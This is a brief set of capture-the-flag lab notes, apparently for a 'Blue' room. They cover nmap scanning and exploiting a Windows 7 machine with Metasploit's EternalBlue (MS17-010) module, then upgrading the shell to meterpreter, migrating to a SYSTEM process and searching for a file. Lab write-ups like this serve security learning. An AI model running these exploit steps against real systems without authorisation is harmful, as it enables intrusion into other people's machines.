# Blue room

Scan and learn what exploit on windows 7 machine (Eternal Blue)

## what was done

Scan with nmap

```sh
nmap -Pn <ip>
nmap -A -T 5 <ip> -vv
nmap --script vuln <ip> -vv
```

gain access with metasploit

```sh
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <ip>
exploit
```

escalate privilage using:

```sh
use multi/manage/shell_to_meterpreter
set session <id_session>
```


## what was learnt

we don't need to open metasploit for inital sacaning

migrate to process NT AUTHORITY\SYSTEM

search for a file in cmd
dir secret.doc /s /p


## tools

